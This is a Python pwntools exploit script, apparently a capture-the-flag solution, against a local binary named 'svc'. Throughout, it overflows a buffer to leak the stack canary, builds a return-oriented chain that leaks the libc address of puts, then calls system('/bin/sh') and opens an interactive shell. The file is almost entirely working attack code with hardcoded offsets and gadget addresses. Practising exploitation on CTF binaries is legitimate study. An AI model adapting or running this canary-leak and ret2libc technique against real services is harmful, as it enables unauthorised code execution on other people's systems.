from pwn import *
import sys

# for gdb run
# python3 exp.py 1 
if len(sys.argv) > 1:
    p = gdb.debug("./svc",'''
    set follow-fork-mode child
    b *0x400a96
    b *0x400cce
    b *0x400cd3
    b *0x400ddf
    b system
    ''')
else:
    p = process("./svc")

elf = ELF('svc')
offset = 21 * 8

def feed(data):
    p.recvuntil(b">>")
    p.sendline(b"1")
    p.recvuntil(b">>")
    p.sendline(data)

def read():
    p.recvuntil(b">>")
    p.sendline(b"2")

def leave():
    p.recvuntil(b">>")
    p.sendline(b"3")

# Offsets
putoffset = 0x62420
systemoffset = 0x30290
binshoffset = 0x1925bd

popRdi = p64(0x400ea3)
putsGot = p64(0x602018) # GOT
putsPlt = p64(0x4008d0) # PLT
startmain = p64(0x400a96)

# Get Canary
payload  = b"A" * 8 * 20
payload += b"B" * 8

feed(payload)
read()
p.recvuntil(b"B"*8 + b"\n")
canary = (u64(b"\x00"+p.recv(7)))

# Payload Shellcode
payload  = b"X" * 168
payload += p64(canary)
payload += b"A" * 8
payload += popRdi
payload += putsGot
payload += putsPlt
payload += startmain

info("Canary : " + hex(canary))
feed(payload)
leave()
p.recvline()
leak = p.recvline().replace(b"\n", b"")
putslibc = u64( leak + b"\x00"*(8-len(leak)) )

info( "Put Address: " + hex(putslibc))

libcBase = putslibc - putoffset
systemLibc = libcBase + systemoffset
binshLibc = libcBase + binshoffset

info( "Libc Base : 0x" + p64(libcBase)[::-1].hex() )
info( "system : 0x" + p64(systemLibc)[::-1].hex() )
info( "bin sh : 0x" + p64(binshLibc)[::-1].hex() )

payload = b"0" * 168
payload += p64(canary)
payload += b"0" * 8
payload += popRdi
payload += p64(binshLibc)
payload += p64(0x00000000004008b1)
payload += p64(systemLibc)

feed(payload)
leave()

p.interactive()